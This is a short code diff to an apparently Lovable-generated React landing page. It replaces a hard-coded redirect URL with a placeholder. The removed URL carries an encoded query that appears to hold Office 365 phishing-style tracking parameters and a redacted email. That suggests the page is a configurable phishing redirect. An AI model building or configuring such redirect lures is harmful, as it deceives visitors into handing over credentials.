@@ -5,7 +5,7 @@ import { ExternalLink } from "lucide-react";
 
 const Index = () => {
   // CONFIGURE YOUR REDIRECT URL HERE
-  const redirectUrl = "https://yourinternetbusinesssoftware.com/n/?c3Y9bzM2NV8xX25vbSZyYW5kPVVuTjBWMm89JnVpZD1VU0VSMTEwMzIwMjVVNDgwMzExNTY=N0123N[EMAIL]";
+  const redirectUrl = "YOUR_NEW_REDIRECT_URL_HERE";
   
   const defaultImage = "/lovable-uploads/d4b1a581-c597-44ad-8111-d3f05fb556f6.png";
   
@@ -51,3 +51,4 @@ const Index = () => {
 };
 
 export default Index;
+
